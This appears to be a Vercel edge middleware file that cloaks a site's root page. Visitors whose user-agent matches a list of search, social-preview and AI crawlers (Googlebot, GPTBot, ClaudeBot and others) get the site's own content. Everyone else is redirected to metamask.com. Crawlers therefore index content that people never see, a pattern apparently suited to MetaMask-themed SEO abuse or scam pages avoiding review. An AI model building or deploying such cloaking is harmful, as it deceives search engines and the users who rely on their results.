import { next, redirect } from "@vercel/edge";

const BOT_PATTERNS = [
  "googlebot", "bingbot", "baiduspider", "yandex", "duckduckbot", "slurp",
  "ia_archiver", "facebookexternalhit", "twitterbot", "whatsapp", "telegrambot",
  "slackbot", "discordbot", "pinterest", "linkedinbot", "applebot", "semrushbot",
  "ahrefsbot", "mj12bot", "dotbot", "petalbot", "bytespider",
  "google-inspectiontool", "googleother", "adsbot-google", "mediapartners-google",
  "feedfetcher-google", "gptbot", "ccbot", "claudebot", "anthropic-ai",
  "perplexitybot", "bingpreview",
];

const BOT_UA = new RegExp(BOT_PATTERNS.join("|"), "i");

export default function middleware(request) {
  const ua = request.headers.get("user-agent") || "";

  if (BOT_UA.test(ua)) {
    return next();
  }

  return redirect("https://metamask.com", 308);
}

export const config = {
  matcher: "/",
};
